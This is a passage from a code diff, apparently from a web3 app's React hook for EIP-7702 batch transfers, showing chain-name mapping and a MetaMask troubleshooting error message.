+                    ? 'Arbitrum'
+                    : chainId === 8453
+                      ? 'Base'
+                      : chainId === 10
+                        ? 'Optimism'
+                        : chainId === 143
+                          ? 'Monad'
+                          : `Chain ${chainId}`
+
+          errorMessage =
+            `Transaction Parameter Error on ${chainName}\n\n` +
+            `This error typically occurs on mobile wallets when the transaction type doesn't match the gas parameters.\n\n` +
+            `Possible solutions:\n` +
+            `1. Try using the desktop version of MetaMask\n` +
+            `2. Update MetaMask mobile app to the latest version\n` +
+            `3. Try refreshing the page and reconnecting your wallet\n` +
+            `4. If the problem persists, this may be a known issue with mobile wallets and EIP-7702 batch transactions\n\n` +
+            `Error details: ${error.message}`
+        } else {
+          errorMessage = error.message
+        }
+      }
+
+      alert(errorMessage)
+      setIsPrechecking(false)
+      setCurrentSendCallsOperation(null)
+    }
+  }
+
+  return executeBatchTransfer
+}
